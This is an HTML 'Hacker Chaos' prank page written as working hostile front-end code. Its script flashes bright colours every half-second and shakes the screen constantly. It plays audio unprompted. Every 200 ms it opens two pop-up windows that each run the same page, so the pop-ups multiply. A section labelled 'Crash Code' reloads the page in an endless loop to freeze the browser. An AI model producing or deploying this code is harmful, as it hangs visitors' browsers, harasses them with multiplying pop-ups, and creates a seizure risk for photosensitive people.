<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hacker Chaos</title>
  <style>
    /* Matrix Effect */
    body {
      font-family: 'Courier New', Courier, monospace;
      background-color: black;
      color: #0f0;
      overflow: hidden;
      margin: 0;
      padding: 0;
      height: 100vh;
      text-align: center;
      font-size: 16px;
    }

    /* Flickering Text */
    @keyframes flicker {
      0% { opacity: 1; }
      20% { opacity: 0; }
      40% { opacity: 1; }
      60% { opacity: 0; }
      80% { opacity: 1; }
      100% { opacity: 0; }
    }

    h1, p {
      animation: flicker 0.5s infinite;
    }

    /* Glitch Effect */
    @keyframes glitch {
      0% { text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.8), -1px -1px 5px rgba(0, 255, 0, 0.8); }
      20% { text-shadow: -1px -1px 5px rgba(0, 0, 255, 0.8), 1px 1px 5px rgba(255, 255, 0, 0.8); }
      40% { text-shadow: -2px 2px 5px rgba(0, 255, 255, 0.8), 2px -2px 5px rgba(255, 0, 255, 0.8); }
      60% { text-shadow: 1px 1px 5px rgba(0, 255, 0, 0.8), -1px -1px 5px rgba(255, 0, 0, 0.8); }
      80% { text-shadow: -1px -1px 5px rgba(255, 0, 255, 0.8), 1px 1px 5px rgba(0, 255, 255, 0.8); }
      100% { text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.8), -1px -1px 5px rgba(0, 255, 0, 0.8); }
    }

    /* Flashing Background */
    @keyframes chaosFlash {
      0% { background-color: red; }
      25% { background-color: yellow; }
      50% { background-color: blue; }
      75% { background-color: purple; }
      100% { background-color: black; }
    }

    #chaosOverlay {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      animation: chaosFlash 0.5s infinite;
    }

    /* Moving Windows */
    .window {
      position: absolute;
      width: 200px;
      height: 200px;
      background-color: #333;
      color: white;
      border: 2px solid #0f0;
      padding: 10px;
    }

  </style>
</head>
<body>

  <!-- Chaos Overlay -->
  <div id="chaosOverlay"></div>

  <h1>Welcome to the System</h1>
  <p>Initializing chaos... Please enjoy your time.</p>

  <!-- Add Matrix-style falling text -->
  <div id="matrix"></div>

  <script>
    // Matrix Effect
    let columns = Math.floor(window.innerWidth / 20);
    let rows = Math.floor(window.innerHeight / 20);
    let matrix = [];
    for (let i = 0; i < columns; i++) {
      matrix[i] = [];
      for (let j = 0; j < rows; j++) {
        matrix[i][j] = String.fromCharCode(Math.random() * 256);
      }
    }

    function matrixEffect() {
      let output = '';
      for (let i = 0; i < columns; i++) {
        output += matrix[i][Math.floor(Math.random() * rows)] + ' ';
      }
      document.getElementById('matrix').innerHTML = output;
      setTimeout(matrixEffect, 100);
    }
    matrixEffect();

    // Screen Shake Effect
    setInterval(() => {
      const x = Math.random() * 20 - 10;
      const y = Math.random() * 20 - 10;
      document.body.style.transform = `translate(${x}px, ${y}px)`;
    }, 20);

    // Flickering Text
    document.querySelectorAll('h1, p').forEach((element) => {
      element.style.animation = 'flicker 0.5s infinite';
    });

    // Glitchy Text Effect
    document.querySelectorAll('h1, p').forEach((element) => {
      element.style.animation = 'glitch 0.5s infinite';
    });

    // Random Audio (MP3 sound)
    const sounds = ['your-audio-file.mp3'];  // Replace with your mp3 file
    setInterval(() => {
      const randomSound = sounds[Math.floor(Math.random() * sounds.length)];
      const audio = new Audio(randomSound);
      audio.play();
    }, Math.random() * 5000);

    // Move Windows Code (Opening pop-up windows)
    function moveWindows() {
      let window1 = window.open(location.href, "_blank", "width=200,height=200");
      let window2 = window.open(location.href, "_blank", "width=200,height=200");

      if (!window1 || window1.closed || typeof window1.closed == "undefined") {
        document.querySelector("h1").innerHTML =
          "Error: Please enable popups and reload this page.";
        clearInterval(interval);
      }

      let window1X = Math.random() * window.innerWidth - 200;
      let window1Y = Math.random() * window.innerHeight - 200;
      let window1VX = 3;
      let window1VY = 3;

      let window2X = Math.random() * window.innerWidth - 200;
      let window2Y = Math.random() * window.innerHeight - 200;
      let window2VX = 3;
      let window2VY = 3;

      const frame = function () {
        window1X += window1VX;
        window1Y += window1VY;
        window1.moveTo(window1X, window1Y);

        window2X += window2VX;
        window2Y += window2VY;
        window2.moveTo(window2X, window2Y);

        if (window1X <= 0 || window1X >= window.innerWidth - 200) {
          window1VX *= -1;
        }
        if (window1Y <= 0 || window1Y >= window.innerHeight - 200) {
          window1VY *= -1;
        }

        if (window2X <= 0 || window2X >= window.innerWidth - 200) {
          window2VX *= -1;
        }
        if (window2Y <= 0 || window2Y >= window.innerHeight - 200) {
          window2VY *= -1;
        }

        requestAnimationFrame(frame);
      };
      frame();
    }

    let interval = setInterval(() => {
      moveWindows();
    }, 200);

    // Crash Code
    onbeforeunload = function () { localStorage.x = 1; };
    setTimeout(function () {
      while (1) location.reload(1);
    }, 1000);
  </script>

</body>
</html>
